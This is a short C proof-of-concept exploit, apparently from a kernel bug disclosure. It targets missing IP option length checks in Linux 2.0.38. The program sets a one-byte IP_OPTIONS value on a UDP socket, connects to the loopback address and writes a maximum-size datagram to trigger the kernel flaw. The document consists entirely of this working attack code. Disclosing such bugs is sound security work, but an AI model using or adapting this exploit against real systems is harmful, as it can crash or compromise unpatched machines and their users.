/* Exploit option length missing checks in Linux-2.0.38
   Andrea Arcangeli <andrea@suse.de> */

#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/udp.h>
#include <netinet/ip.h>

main()
{
	int sk;
	struct sockaddr_in sin;
	struct hostent * hostent;
#define PAYLOAD_SIZE (0xffff-sizeof(struct udphdr)-sizeof(struct iphdr))
#define OPT_SIZE 1
	char payload[PAYLOAD_SIZE];

	sk = socket(AF_INET, SOCK_DGRAM, 0);
	if (sk < 0)
		perror("socket"), exit(1);

	if (setsockopt(sk, SOL_IP, IP_OPTIONS, payload, OPT_SIZE) < 0)
		perror("setsockopt"), exit(1);

	bzero((char *)&sin, sizeof(sin));

	sin.sin_port = htons(0);
	sin.sin_family = AF_INET;
	sin.sin_addr.s_addr = htonl(2130706433);

	if (connect(sk, (struct sockaddr *) &sin, sizeof(sin)) < 0)
		perror("connect"), exit(1);

	if (write(sk, payload, PAYLOAD_SIZE) < 0)
		perror("write"), exit(1);
}

